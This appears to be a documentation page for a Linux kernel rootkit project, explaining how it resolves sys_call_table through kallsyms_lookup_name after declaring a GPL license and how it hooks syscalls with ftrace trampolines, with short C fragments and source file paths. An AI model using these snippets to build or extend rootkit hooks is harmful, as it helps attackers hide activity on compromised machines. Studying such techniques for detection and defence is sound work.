---
title: "Symbol Resolution & Ftrace Hooks"
description: "How we locate sys_call_table and intercept syscalls via ftrace"
icon: "code"
date: "2025-05-11T18:20:00+01:00"
lastmod: "2025-05-11T18:20:00+01:00"
draft: false
toc: true
weight: 20
---

# Symbol Resolution

1. We spoof a GPL license so the kernel exports `kallsyms_lookup_name()`:
   ```c
   MODULE_LICENSE("GPL");
   ```
2. At init, we call:
   ```c
   sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
   ```
   This gives us the address of the syscall table.

---

# Ftrace-Based Hooking

{{< alert context="info" icon="🔧" text="We use ftrace to hook without writing to kernel memory directly." />}}

For each target syscall:

1. Define an `ftrace_ops` with flags:
   ```c
   .func  = hook_trampoline,
   .flags = FTRACE_OPS_FL_SAVE_REGS |
            FTRACE_OPS_FL_IPMODIFY
   ```
2. Apply the filter:
   ```c
   ftrace_set_filter_ip(&ops, (unsigned long)orig_syscall, 0, 0);
   register_ftrace_function(&ops);
   ```
3. Our trampoline copies registers, calls `hook_fn()`, then jumps back to the original.


Always unregister your ftrace functions in `cleanup_module()`:
```c
unregister_ftrace_function(&ops);
```


---

## Code Location

- `rootkit/hook/ftrace_hooks.c`  
- `rootkit/hook/syscall_list.h`
```
